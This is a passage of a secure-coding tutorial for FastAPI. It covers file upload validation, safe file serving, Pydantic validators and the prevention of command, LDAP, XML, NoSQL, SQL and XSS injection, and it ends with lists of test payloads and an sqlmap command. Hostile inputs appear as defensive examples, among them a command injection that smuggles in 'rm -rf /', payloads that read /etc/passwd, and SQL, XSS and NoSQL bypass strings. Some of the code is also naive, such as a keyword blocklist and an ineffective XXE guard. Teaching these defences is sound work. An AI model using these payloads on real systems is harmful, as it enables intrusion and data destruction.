Use antivirus scanning for uploaded files:

```python
import clamd

async def scan_file_for_malware(file_path: Path) -> bool:
    """
    Scan file using ClamAV.
    Returns True if clean, raises exception if infected.
    """
    try:
        # Connect to ClamAV daemon
        cd = clamd.ClamdUnixSocket()

        # Scan file
        result = cd.scan(str(file_path))

        if result[str(file_path)][0] == 'FOUND':
            virus_name = result[str(file_path)][1]
            raise ValueError(f"Malware detected: {virus_name}")

        return True

    except clamd.ConnectionError:
        # ClamAV not available - decide how to handle
        # Option 1: Fail closed (reject uploads)
        raise HTTPException(status_code=503, detail="Virus scanning unavailable")

        # Option 2: Fail open (allow uploads with warning)
        # logger.warning("ClamAV unavailable, skipping virus scan")
        # return True
```

**ClamAV Setup** (Docker):

```yaml
# docker-compose.yml
services:
  clamav:
    image: clamav/clamav:latest
    volumes:
      - ./clamav-data:/var/lib/clamav
    ports:
      - "3310:3310"
```

#### Content Analysis

Validate file content matches declared type:

```python
from PIL import Image
from io import BytesIO

async def validate_image_content(content: bytes):
    """
    Verify file is actually a valid image.
    """
    try:
        image = Image.open(BytesIO(content))
        image.verify()  # Verify it's a valid image

        # Additional checks
        if image.format not in ['JPEG', 'PNG', 'GIF', 'WEBP']:
            raise ValueError(f"Unsupported image format: {image.format}")

        # Size constraints
        max_dimensions = (4000, 4000)
        if image.width > max_dimensions[0] or image.height > max_dimensions[1]:
            raise ValueError("Image dimensions too large")

        return True

    except Exception as e:
        raise ValueError(f"Invalid image file: {str(e)}")
```

**PDF Validation**:

```python
import PyPDF2
from io import BytesIO

async def validate_pdf_content(content: bytes):
    """
    Verify file is a valid PDF.
    """
    try:
        pdf = PyPDF2.PdfReader(BytesIO(content))

        # Check if encrypted
        if pdf.is_encrypted:
            raise ValueError("Encrypted PDFs not allowed")

        # Check page count
        if len(pdf.pages) > 100:
            raise ValueError("PDF has too many pages")

        return True

    except PyPDF2.errors.PdfReadError as e:
        raise ValueError(f"Invalid PDF file: {str(e)}")
```

### 5.6 Secure File Storage

#### Storage Location

Store uploads outside web root:

```
/app/
  ├── main.py
  ├── static/          # Web-accessible static files
  │   └── css/
  └── uploads/         # NOT web-accessible
      ├── avatars/
      ├── documents/
      └── temp/
```

**Never store in static file directory** or anywhere directly accessible via URL.

#### File Permissions

Set restrictive permissions:

```python
import os

def save_with_permissions(file_path: Path, content: bytes):
    """
    Save file with restricted permissions.
    """
    # Write file
    file_path.write_bytes(content)

    # Set permissions: owner read/write only (0600)
    os.chmod(file_path, 0o600)
```

**Unix Permissions**:

- `0600`: Owner read/write only
- `0400`: Owner read-only (for archived files)
- Never `0777` or `0666` (world writable)

#### Serving Uploaded Files Safely

Never serve files directly from upload directory:

```python
from fastapi.responses import StreamingResponse
from pathlib import Path
import mimetypes

UPLOAD_DIR = Path("/app/uploads").resolve()

@app.get("/files/{file_id}")
async def serve_file(file_id: str, db: Session = Depends(get_db)):
    """
    Serve uploaded file with authorization check.
    """
    # Get file metadata from database
    file_record = db.query(File).filter(File.id == file_id).first()
    if not file_record:
        raise HTTPException(status_code=404, detail="File not found")

    # Authorization check
    if file_record.owner_id != current_user.id and not file_record.is_public:
        raise HTTPException(status_code=403, detail="Access denied")

    # Construct file path
    file_path = UPLOAD_DIR / file_record.storage_path

    # Verify file exists and is within upload directory
    if not file_path.is_relative_to(UPLOAD_DIR) or not file_path.is_file():
        raise HTTPException(status_code=404, detail="File not found")

    # Determine MIME type
    mime_type, _ = mimetypes.guess_type(file_record.original_filename)

    # Stream file (efficient for large files)
    def iterfile():
        with open(file_path, 'rb') as f:
            while chunk := f.read(8192):
                yield chunk

    return StreamingResponse(
        iterfile(),
        media_type=mime_type or 'application/octet-stream',
        headers={
            'Content-Disposition': f'attachment; filename="{file_record.original_filename}"'
        }
    )
```

**Key Security Practices**:

1. Use database IDs, not filenames, in URLs
2. Check authorization before serving
3. Set Content-Disposition header to force download
4. Never execute uploaded files
5. Store metadata (owner, upload date) in database

### 5.7 Complete File Upload Implementation

```python
from fastapi import FastAPI, UploadFile, HTTPException, Depends
from sqlalchemy.orm import Session
from pathlib import Path
import uuid
import hashlib
from datetime import datetime

app = FastAPI()

UPLOAD_DIR = Path("/app/uploads").resolve()
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf'}
ALLOWED_MIME_TYPES = {
    'image/jpeg', 'image/png', 'image/gif', 'application/pdf'
}

async def validate_upload(file: UploadFile) -> bytes:
    """
    Comprehensive file upload validation.
    Returns file content if valid, raises HTTPException otherwise.
    """
    # 1. Validate filename
    if not file.filename:
        raise HTTPException(status_code=400, detail="Filename required")

    # 2. Validate file extension
    ext = Path(file.filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(
            status_code=400,
            detail=f"File extension {ext} not allowed"
        )

    # 3. Validate MIME type
    if file.content_type not in ALLOWED_MIME_TYPES:
        raise HTTPException(
            status_code=400,
            detail=f"File type {file.content_type} not allowed"
        )

    # 4. Read and validate file size
    content = await file.read()
    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(
            status_code=413,
            detail=f"File too large. Max size: {MAX_FILE_SIZE} bytes"
        )

    # 5. Validate magic number (file header)
    file_type = imghdr.what(None, h=content)
    if ext in ['.jpg', '.jpeg', '.png', '.gif']:
        if not file_type or file_type not in ['jpeg', 'png', 'gif']:
            raise HTTPException(
                status_code=400,
                detail="File content doesn't match extension"
            )

    # 6. Image-specific validation
    if file_type in ['jpeg', 'png', 'gif']:
        try:
            from PIL import Image
            from io import BytesIO
            img = Image.open(BytesIO(content))
            img.verify()

            if img.width > 4000 or img.height > 4000:
                raise HTTPException(
                    status_code=400,
                    detail="Image dimensions too large"
                )
        except Exception as e:
            raise HTTPException(
                status_code=400,
                detail=f"Invalid image file: {str(e)}"
            )

    return content

def generate_storage_path(original_filename: str) -> str:
    """
    Generate secure storage path.
    Format: YYYY/MM/DD/uuid-sanitized_filename
    """
    # Get file extension
    ext = Path(original_filename).suffix.lower()

    # Generate UUID-based filename
    unique_id = str(uuid.uuid4())
    filename = f"{unique_id}{ext}"

    # Create date-based subdirectory structure
    now = datetime.utcnow()
    subdir = f"{now.year}/{now.month:02d}/{now.day:02d}"

    return f"{subdir}/{filename}"

def calculate_file_hash(content: bytes) -> str:
    """
    Calculate SHA-256 hash of file content.
    Useful for deduplication and integrity verification.
    """
    return hashlib.sha256(content).hexdigest()

@app.post("/upload")
async def upload_file(
    file: UploadFile,
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    """
    Secure file upload endpoint with comprehensive validation.
    """
    # Validate file
    content = await validate_upload(file)

    # Calculate file hash (for deduplication)
    file_hash = calculate_file_hash(content)

    # Check if file already exists (deduplication)
    existing_file = db.query(File).filter(
        File.hash == file_hash,
        File.owner_id == current_user.id
    ).first()

    if existing_file:
        return {
            "id": existing_file.id,
            "message": "File already exists",
            "filename": existing_file.original_filename
        }

    # Generate storage path
    storage_path = generate_storage_path(file.filename)
    full_path = UPLOAD_DIR / storage_path

    # Create subdirectories
    full_path.parent.mkdir(parents=True, exist_ok=True)

    # Save file with restricted permissions
    full_path.write_bytes(content)
    os.chmod(full_path, 0o600)

    # Optional: Scan for malware
    # await scan_file_for_malware(full_path)

    # Store metadata in database
    file_record = File(
        id=str(uuid.uuid4()),
        original_filename=file.filename,
        storage_path=storage_path,
        mime_type=file.content_type,
        size=len(content),
        hash=file_hash,
        owner_id=current_user.id,
        uploaded_at=datetime.utcnow()
    )

    db.add(file_record)
    db.commit()

    return {
        "id": file_record.id,
        "filename": file_record.original_filename,
        "size": file_record.size,
        "uploaded_at": file_record.uploaded_at
    }
```

**Database Model**:

```python
from sqlalchemy import Column, String, Integer, DateTime, ForeignKey
from sqlalchemy.orm import relationship

class File(Base):
    __tablename__ = "files"

    id = Column(String, primary_key=True)
    original_filename = Column(String(255), nullable=False)
    storage_path = Column(String(500), nullable=False, unique=True)
    mime_type = Column(String(100), nullable=False)
    size = Column(Integer, nullable=False)
    hash = Column(String(64), nullable=False, index=True)
    owner_id = Column(String, ForeignKey("users.id"), nullable=False)
    uploaded_at = Column(DateTime, nullable=False)
    is_public = Column(Boolean, default=False)

    owner = relationship("User", back_populates="files")
```

---

## 6. Input Validation with Pydantic

### 6.1 Pydantic Validators

Pydantic provides multiple validation mechanisms:

**Field Validators**: Validate individual fields
**Root Validators**: Validate entire model
**Model Validators**: Class-level validation

#### Field Validators

```python
from pydantic import BaseModel, Field, field_validator
import re

class UserCreate(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    email: str
    age: int = Field(..., ge=13, le=120)

    @field_validator('username')
    @classmethod
    def username_alphanumeric(cls, v: str) -> str:
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Username must contain only letters, numbers, and underscores')

        # Reserved usernames
        if v.lower() in ['admin', 'root', 'system']:
            raise ValueError('Username is reserved')

        return v

    @field_validator('email')
    @classmethod
    def email_valid(cls, v: str) -> str:
        # Basic email validation
        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', v):
            raise ValueError('Invalid email format')

        # Reject disposable email domains
        disposable_domains = ['tempmail.com', '10minutemail.com']
        domain = v.split('@')[1]
        if domain in disposable_domains:
            raise ValueError('Disposable email addresses not allowed')

        return v.lower()  # Normalize email to lowercase
```

#### Root Validators

Validate relationships between fields:

```python
from pydantic import BaseModel, model_validator

class PasswordReset(BaseModel):
    password: str
    password_confirm: str

    @model_validator(mode='after')
    def passwords_match(self):
        if self.password != self.password_confirm:
            raise ValueError('Passwords do not match')
        return self

class DateRange(BaseModel):
    start_date: datetime
    end_date: datetime

    @model_validator(mode='after')
    def end_after_start(self):
        if self.end_date <= self.start_date:
            raise ValueError('End date must be after start date')
        return self
```

#### Model Validators (Class-Level)

```python
from pydantic import BaseModel, model_validator
from typing import List

class BulkUserCreate(BaseModel):
    users: List[UserCreate]

    @model_validator(mode='after')
    def check_unique_usernames(self):
        usernames = [user.username for user in self.users]
        if len(usernames) != len(set(usernames)):
            raise ValueError('Duplicate usernames in batch')
        return self
```

### 6.2 Custom Validation Functions

Reusable validation logic:

```python
from pydantic import BaseModel, field_validator
import re

def validate_no_sql_keywords(v: str) -> str:
    """
    Prevent SQL keywords in input.
    """
    sql_keywords = [
        'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP',
        'CREATE', 'ALTER', 'EXEC', 'UNION', 'OR', 'AND'
    ]

    for keyword in sql_keywords:
        if re.search(rf'\b{keyword}\b', v, re.IGNORECASE):
            raise ValueError(f'Input contains forbidden SQL keyword: {keyword}')

    return v

def validate_no_script_tags(v: str) -> str:
    """
    Prevent script tags in input.
    """
    if re.search(r'<script|javascript:', v, re.IGNORECASE):
        raise ValueError('Script tags not allowed')

    return v

class CommentCreate(BaseModel):
    text: str = Field(..., max_length=5000)

    @field_validator('text')
    @classmethod
    def sanitize_text(cls, v: str) -> str:
        v = validate_no_script_tags(v)
        v = validate_no_sql_keywords(v)
        return v.strip()
```

### 6.3 Regex Patterns for Validation

Common validation patterns:

```python
from pydantic import BaseModel, Field, field_validator
import re

# Email pattern
EMAIL_PATTERN = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

# URL pattern
URL_PATTERN = r'^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)$'

# Phone pattern (US)
PHONE_PATTERN = r'^\+?1?\d{10,15}$'

# Username pattern
USERNAME_PATTERN = r'^[a-zA-Z0-9_]{3,30}$'

# IPv4 pattern
IPV4_PATTERN = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'

# Credit card pattern (basic)
CREDIT_CARD_PATTERN = r'^\d{13,19}$'

# Hex color pattern
HEX_COLOR_PATTERN = r'^#?([0-9A-Fa-f]{6}|[0-9A-Fa-f]{3})$'

class UserProfile(BaseModel):
    username: str = Field(..., pattern=USERNAME_PATTERN)
    email: str = Field(..., pattern=EMAIL_PATTERN)
    website: str | None = Field(None, pattern=URL_PATTERN)
    phone: str | None = Field(None, pattern=PHONE_PATTERN)

class ServerConfig(BaseModel):
    ip_address: str = Field(..., pattern=IPV4_PATTERN)

class ThemeSettings(BaseModel):
    primary_color: str = Field(..., pattern=HEX_COLOR_PATTERN)

    @field_validator('primary_color')
    @classmethod
    def normalize_color(cls, v: str) -> str:
        # Ensure # prefix
        if not v.startswith('#'):
            v = f"#{v}"
        return v.upper()
```

### 6.4 Field Constraints

Pydantic built-in constraints:

```python
from pydantic import BaseModel, Field, constr, conint, confloat
from typing import List
from datetime import datetime

class ProductCreate(BaseModel):
    # String constraints
    name: str = Field(..., min_length=3, max_length=200)
    description: str | None = Field(None, max_length=5000)
    sku: str = Field(..., pattern=r'^[A-Z0-9-]{8,20}$')

    # Numeric constraints
    price: float = Field(..., gt=0, le=1000000)  # gt: greater than, le: less than or equal
    discount_percent: int = Field(0, ge=0, le=100)  # ge: greater than or equal
    stock_quantity: int = Field(..., ge=0)

    # List constraints
    tags: List[str] = Field(..., min_length=1, max_length=10)

    # Constrained types (alternative syntax)
    category: constr(min_length=3, max_length=50)
    rating: confloat(ge=0.0, le=5.0)
    views: conint(ge=0)

class DateRangeQuery(BaseModel):
    start_date: datetime
    end_date: datetime

    @model_validator(mode='after')
    def validate_range(self):
        if (self.end_date - self.start_date).days > 365:
            raise ValueError('Date range cannot exceed 1 year')
        return self

class PaginationParams(BaseModel):
    page: int = Field(1, ge=1, le=1000)
    size: int = Field(20, ge=1, le=100)

    @model_validator(mode='after')
    def calculate_offset(self):
        self.offset = (self.page - 1) * self.size
        return self
```

### 6.5 Validation Examples

**Comprehensive User Registration**:

```python
from pydantic import BaseModel, Field, field_validator, EmailStr
from datetime import datetime
import re

class UserRegistration(BaseModel):
    username: str = Field(..., min_length=3, max_length=30)
    email: EmailStr  # Built-in email validation
    password: str = Field(..., min_length=8, max_length=100)
    password_confirm: str
    date_of_birth: datetime
    terms_accepted: bool

    @field_validator('username')
    @classmethod
    def username_valid(cls, v: str) -> str:
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Username can only contain letters, numbers, and underscores')

        if v[0].isdigit():
            raise ValueError('Username cannot start with a number')

        forbidden = ['admin', 'root', 'system', 'null', 'undefined']
        if v.lower() in forbidden:
            raise ValueError('Username is reserved')

        return v

    @field_validator('password')
    @classmethod
    def password_strong(cls, v: str) -> str:
        if len(v) < 8:
            raise ValueError('Password must be at least 8 characters')

        if not re.search(r'[A-Z]', v):
            raise ValueError('Password must contain uppercase letter')

        if not re.search(r'[a-z]', v):
            raise ValueError('Password must contain lowercase letter')

        if not re.search(r'\d', v):
            raise ValueError('Password must contain digit')

        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', v):
            raise ValueError('Password must contain special character')

        return v

    @field_validator('date_of_birth')
    @classmethod
    def age_requirement(cls, v: datetime) -> datetime:
        age = (datetime.now() - v).days / 365.25
        if age < 13:
            raise ValueError('Must be at least 13 years old')
        if age > 120:
            raise ValueError('Invalid date of birth')
        return v

    @model_validator(mode='after')
    def passwords_match(self):
        if self.password != self.password_confirm:
            raise ValueError('Passwords do not match')
        return self

    @model_validator(mode='after')
    def terms_must_be_accepted(self):
        if not self.terms_accepted:
            raise ValueError('Must accept terms and conditions')
        return self
```

**API Query Validation**:

```python
from pydantic import BaseModel, Field, field_validator
from typing import List, Literal

class ProductSearchQuery(BaseModel):
    q: str | None = Field(None, max_length=200)
    category: str | None = Field(None, max_length=50)
    min_price: float | None = Field(None, ge=0)
    max_price: float | None = Field(None, ge=0)
    sort_by: Literal['price', 'name', 'date', 'rating'] = 'date'
    sort_order: Literal['asc', 'desc'] = 'asc'
    page: int = Field(1, ge=1, le=100)
    page_size: int = Field(20, ge=1, le=100)

    @field_validator('q')
    @classmethod
    def sanitize_search(cls, v: str | None) -> str | None:
        if v is None:
            return v

        # Remove SQL keywords
        forbidden = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', '--', ';']
        for keyword in forbidden:
            if keyword.lower() in v.lower():
                raise ValueError(f'Search contains forbidden term: {keyword}')

        # Limit special characters
        if len(re.findall(r'[^a-zA-Z0-9\s]', v)) > 5:
            raise ValueError('Too many special characters in search')

        return v.strip()

    @model_validator(mode='after')
    def validate_price_range(self):
        if self.min_price and self.max_price:
            if self.min_price > self.max_price:
                raise ValueError('min_price cannot exceed max_price')
        return self

@app.get("/products/search")
async def search_products(query: ProductSearchQuery, db: Session = Depends(get_db)):
    # All query parameters are validated
    filters = []

    if query.q:
        filters.append(Product.name.ilike(f"%{query.q}%"))

    if query.category:
        filters.append(Product.category == query.category)

    if query.min_price:
        filters.append(Product.price >= query.min_price)

    if query.max_price:
        filters.append(Product.price <= query.max_price)

    results = db.query(Product).filter(*filters).order_by(
        getattr(Product, query.sort_by).desc() if query.sort_order == 'desc'
        else getattr(Product, query.sort_by).asc()
    ).limit(query.page_size).offset((query.page - 1) * query.page_size).all()

    return {"results": results, "page": query.page}
```

---

## 7. Other Input Attack Prevention

### 7.1 Command Injection

Occurs when user input is passed to system shell commands.

**Vulnerable Code**:

```python
import os

filename = request.query_params.get("file")
os.system(f"cat {filename}")  # DANGEROUS

# Attack: file=test.txt; rm -rf /
# Executes: cat test.txt; rm -rf /
```

**Prevention**:

1. **Never use shell=True with subprocess**
2. **Never concatenate user input into shell commands**
3. **Use subprocess with argument lists**
4. **Validate and whitelist input**

**Safe Approach**:

```python
import subprocess
from pathlib import Path

ALLOWED_DIR = Path("/app/data").resolve()

def read_file_safe(filename: str) -> str:
    # Validate filename
    file_path = ALLOWED_DIR / filename
    file_path = file_path.resolve()

    if not file_path.is_relative_to(ALLOWED_DIR):
        raise ValueError("Invalid file path")

    # Use subprocess safely (no shell)
    result = subprocess.run(
        ['cat', str(file_path)],
        capture_output=True,
        text=True,
        timeout=5,
        check=True
    )

    return result.stdout
```

**Better: Avoid Shell Commands**:

```python
def read_file_python(filename: str) -> str:
    file_path = ALLOWED_DIR / filename
    file_path = file_path.resolve()

    if not file_path.is_relative_to(ALLOWED_DIR):
        raise ValueError("Invalid file path")

    return file_path.read_text()
```

### 7.2 LDAP Injection

Occurs when constructing LDAP queries with user input.

**Vulnerable Code**:

```python
username = request.form.get("username")
ldap_filter = f"(&(uid={username})(objectClass=person))"

# Attack: username=*)(uid=*
# Result: (&(uid=*)(uid=*)(objectClass=person))
# Returns all users
```

**Prevention**:

```python
import ldap
from ldap.filter import escape_filter_chars

def search_user_safe(username: str):
    # Escape special LDAP characters
    safe_username = escape_filter_chars(username)

    ldap_filter = f"(&(uid={safe_username})(objectClass=person))"

    conn = ldap.initialize('ldap://localhost')
    results = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, ldap_filter)

    return results
```

**LDAP Special Characters**:

```
* ( ) \ NUL
```

### 7.3 XML Injection

Occurs when user input is included in XML without escaping.

**Vulnerable Code**:

```python
user_data = request.form.get("data")
xml = f"<user><data>{user_data}</data></user>"

# Attack: data=</data><admin>true</admin><data>
# Result: <user><data></data><admin>true</admin><data></data></user>
```

**Prevention**:

```python
import xml.etree.ElementTree as ET
from xml.sax.saxutils import escape

def create_xml_safe(user_data: str) -> str:
    # Escape XML special characters
    safe_data = escape(user_data)

    # Better: Use XML library
    root = ET.Element('user')
    data_elem = ET.SubElement(root, 'data')
    data_elem.text = user_data  # Automatically escaped

    return ET.tostring(root, encoding='unicode')
```

**XML External Entity (XXE) Prevention**:

```python
import xml.etree.ElementTree as ET

def parse_xml_safe(xml_string: str):
    # Disable external entity resolution
    parser = ET.XMLParser()
    parser.entity = {}  # Disable entity expansion

    tree = ET.fromstring(xml_string, parser=parser)
    return tree
```

### 7.4 NoSQL Injection

Occurs in MongoDB and similar databases when user input modifies query structure.

**Vulnerable Code**:

```python
from pymongo import MongoClient

username = request.json.get("username")
password = request.json.get("password")

db = MongoClient()['mydb']
user = db.users.find_one({
    "username": username,
    "password": password
})

# Attack JSON: {"username": {"$ne": null}, "password": {"$ne": null}}
# Result: Returns first user where username and password are not null
```

**Prevention**:

```python
from pymongo import MongoClient
from pydantic import BaseModel, Field

class LoginCredentials(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    password: str = Field(..., min_length=8)

def authenticate_user(credentials: LoginCredentials):
    # Pydantic ensures strings, not objects
    db = MongoClient()['mydb']

    user = db.users.find_one({
        "username": credentials.username,
        "password": hash_password(credentials.password)
    })

    return user

# Alternative: Explicitly validate types
def authenticate_user_strict(username: str, password: str):
    # Ensure inputs are strings
    if not isinstance(username, str) or not isinstance(password, str):
        raise ValueError("Invalid input types")

    db = MongoClient()['mydb']

    user = db.users.find_one({
        "username": username,
        "password": hash_password(password)
    })

    return user
```

**NoSQL Operator Filtering**:

```python
def sanitize_mongodb_query(user_input: dict) -> dict:
    """
    Remove MongoDB operators from user input.
    """
    forbidden_operators = ['$ne', '$gt', '$lt', '$gte', '$lte', '$in', '$nin', '$regex', '$where']

    def remove_operators(obj):
        if isinstance(obj, dict):
            return {
                k: remove_operators(v)
                for k, v in obj.items()
                if not k.startswith('$') or k not in forbidden_operators
            }
        elif isinstance(obj, list):
            return [remove_operators(item) for item in obj]
        return obj

    return remove_operators(user_input)
```

---

## 8. Complete Practical Examples

### 8.1 Secure File Upload Endpoint

```python
from fastapi import FastAPI, UploadFile, HTTPException, Depends
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from pathlib import Path
import uuid
import hashlib
from datetime import datetime
import imghdr
from PIL import Image
from io import BytesIO

app = FastAPI()

UPLOAD_DIR = Path("/app/uploads").resolve()
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
ALLOWED_TYPES = {'.jpg', '.jpeg', '.png', '.gif'}

async def validate_image_upload(file: UploadFile) -> bytes:
    # Extension check
    ext = Path(file.filename).suffix.lower()
    if ext not in ALLOWED_TYPES:
        raise HTTPException(400, f"File type {ext} not allowed")

    # Read content
    content = await file.read()

    # Size check
    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(413, "File too large")

    # Magic number check
    file_type = imghdr.what(None, h=content)
    if file_type not in ['jpeg', 'png', 'gif']:
        raise HTTPException(400, "Invalid image file")

    # Image validation with PIL
    try:
        img = Image.open(BytesIO(content))
        img.verify()

        if img.width > 4000 or img.height > 4000:
            raise HTTPException(400, "Image too large")
    except Exception as e:
        raise HTTPException(400, f"Invalid image: {str(e)}")

    return content

def generate_storage_path(filename: str) -> str:
    ext = Path(filename).suffix.lower()
    unique_id = uuid.uuid4()
    now = datetime.utcnow()
    return f"{now.year}/{now.month:02d}/{now.day:02d}/{unique_id}{ext}"

@app.post("/upload")
async def upload_image(
    file: UploadFile,
    db: Session = Depends(get_db),
    user: User = Depends(get_current_user)
):
    content = await validate_image_upload(file)

    file_hash = hashlib.sha256(content).hexdigest()

    existing = db.query(Image).filter(
        Image.hash == file_hash,
        Image.user_id == user.id
    ).first()

    if existing:
        return {"id": existing.id, "message": "File already exists"}

    storage_path = generate_storage_path(file.filename)
    full_path = UPLOAD_DIR / storage_path
    full_path.parent.mkdir(parents=True, exist_ok=True)

    full_path.write_bytes(content)

    image_record = Image(
        id=str(uuid.uuid4()),
        filename=file.filename,
        storage_path=storage_path,
        size=len(content),
        hash=file_hash,
        user_id=user.id
    )

    db.add(image_record)
    db.commit()

    return {"id": image_record.id, "filename": file.filename}

@app.get("/images/{image_id}")
async def get_image(
    image_id: str,
    db: Session = Depends(get_db),
    user: User = Depends(get_current_user)
):
    image = db.query(Image).filter(Image.id == image_id).first()
    if not image:
        raise HTTPException(404, "Image not found")

    if image.user_id != user.id:
        raise HTTPException(403, "Access denied")

    file_path = UPLOAD_DIR / image.storage_path

    if not file_path.is_relative_to(UPLOAD_DIR) or not file_path.is_file():
        raise HTTPException(404, "File not found")

    return FileResponse(file_path, media_type="image/jpeg")
```

### 8.2 SQL Injection Prevention with SQLAlchemy

```python
from fastapi import FastAPI, Depends, HTTPException
from sqlalchemy.orm import Session
from sqlalchemy import text
from pydantic import BaseModel, Field, field_validator
import re

app = FastAPI()

class UserSearch(BaseModel):
    username: str = Field(..., min_length=1, max_length=50)
    min_age: int = Field(0, ge=0, le=150)

    @field_validator('username')
    @classmethod
    def username_alphanumeric(cls, v: str) -> str:
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Invalid username format')
        return v

@app.get("/users/search")
def search_users(search: UserSearch, db: Session = Depends(get_db)):
    # Safe: SQLAlchemy ORM with parameterization
    users = db.query(User).filter(
        User.username.like(f"%{search.username}%"),
        User.age >= search.min_age
    ).all()

    return {"users": [{"id": u.id, "username": u.username} for u in users]}

@app.get("/users/search-raw")
def search_users_raw(search: UserSearch, db: Session = Depends(get_db)):
    # Safe: Raw SQL with parameterization
    query = text("""
        SELECT id, username, email
        FROM users
        WHERE username LIKE :pattern AND age >= :min_age
    """)

    results = db.execute(query, {
        "pattern": f"%{search.username}%",
        "min_age": search.min_age
    })

    return {"users": [dict(row) for row in results]}
```

### 8.3 XSS Prevention in User Content

```python
from fastapi import FastAPI, Depends, HTTPException
from pydantic import BaseModel, Field, field_validator
from bleach import clean
import html

app = FastAPI()

ALLOWED_HTML_TAGS = ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li']
ALLOWED_ATTRIBUTES = {}

class CommentCreate(BaseModel):
    text: str = Field(..., min_length=1, max_length=5000)

    @field_validator('text')
    @classmethod
    def sanitize_html(cls, v: str) -> str:
        # Remove script tags
        clean_text = clean(
            v,
            tags=ALLOWED_HTML_TAGS,
            attributes=ALLOWED_ATTRIBUTES,
            strip=True
        )
        return clean_text.strip()

@app.post("/comments")
def create_comment(
    comment: CommentCreate,
    db: Session = Depends(get_db),
    user: User = Depends(get_current_user)
):
    # comment.text is already sanitized by Pydantic
    db_comment = Comment(
        text=comment.text,
        user_id=user.id
    )

    db.add(db_comment)
    db.commit()

    return {"id": db_comment.id, "text": db_comment.text}

@app.get("/comments")
def get_comments(db: Session = Depends(get_db)):
    comments = db.query(Comment).all()

    # Additional escaping for JSON response (defense in depth)
    return {
        "comments": [
            {
                "id": c.id,
                "text": html.escape(c.text),
                "user": c.user.username
            }
            for c in comments
        ]
    }
```

### 8.4 Path Traversal Prevention in File Serving

```python
from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse
from pathlib import Path
import re

app = FastAPI()

DATA_DIR = Path("/app/user_data").resolve()

def safe_file_path(filename: str) -> Path:
    # Remove path components
    filename = Path(filename).name

    # Remove dangerous characters
    filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)

    if not filename:
        raise HTTPException(400, "Invalid filename")

    file_path = (DATA_DIR / filename).resolve()

    if not file_path.is_relative_to(DATA_DIR):
        raise HTTPException(400, "Path traversal detected")

    if not file_path.is_file():
        raise HTTPException(404, "File not found")

    return file_path

@app.get("/files/{filename}")
def download_file(filename: str):
    file_path = safe_file_path(filename)

    return FileResponse(
        path=file_path,
        filename=file_path.name,
        media_type='application/octet-stream'
    )
```

### 8.5 Comprehensive Input Validation

```python
from fastapi import FastAPI, Depends
from pydantic import BaseModel, Field, EmailStr, field_validator, model_validator
from datetime import datetime
import re

app = FastAPI()

class UserRegistration(BaseModel):
    username: str = Field(..., min_length=3, max_length=30)
    email: EmailStr
    password: str = Field(..., min_length=8)
    password_confirm: str
    age: int = Field(..., ge=13, le=120)
    bio: str | None = Field(None, max_length=500)

    @field_validator('username')
    @classmethod
    def username_valid(cls, v: str) -> str:
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Username must be alphanumeric with underscores')

        forbidden = ['admin', 'root', 'system']
        if v.lower() in forbidden:
            raise ValueError('Username reserved')

        return v

    @field_validator('password')
    @classmethod
    def password_strong(cls, v: str) -> str:
        if not re.search(r'[A-Z]', v):
            raise ValueError('Password must contain uppercase')
        if not re.search(r'[a-z]', v):
            raise ValueError('Password must contain lowercase')
        if not re.search(r'\d', v):
            raise ValueError('Password must contain digit')
        return v

    @field_validator('bio')
    @classmethod
    def bio_safe(cls, v: str | None) -> str | None:
        if v is None:
            return v

        if re.search(r'<script|javascript:', v, re.IGNORECASE):
            raise ValueError('Script tags not allowed')

        return v.strip()

    @model_validator(mode='after')
    def passwords_match(self):
        if self.password != self.password_confirm:
            raise ValueError('Passwords do not match')
        return self

@app.post("/register")
def register_user(user: UserRegistration, db: Session = Depends(get_db)):
    # All validation done by Pydantic
    # Hash password
    hashed_password = hash_password(user.password)

    db_user = User(
        username=user.username,
        email=user.email,
        password_hash=hashed_password,
        age=user.age,
        bio=user.bio
    )

    db.add(db_user)
    db.commit()

    return {"id": db_user.id, "username": db_user.username}
```

---

## 9. Security Testing

### 9.1 Manual Testing Techniques

**SQL Injection Test Payloads**:

```
' OR '1'='1
' OR 1=1 --
admin' --
' UNION SELECT NULL--
```

**XSS Test Payloads**:

```html
<script>
  alert("XSS");
</script>
<img src=x onerror=alert('XSS')> <svg onload=alert('XSS')>
javascript:alert('XSS')
```

**Path Traversal Test Payloads**:

```
../../etc/passwd
....//....//etc/passwd
..%2F..%2Fetc%2Fpasswd
/etc/passwd
```

**Command Injection Test Payloads**:

```
; ls -la
| cat /etc/passwd
`whoami`
$(whoami)
```

### 9.2 Automated Security Testing Tools

**SQLMap** - SQL injection testing:

```bash
sqlmap -u "http://localhost:8000/users?id=1" --batch --level=5 --risk=3
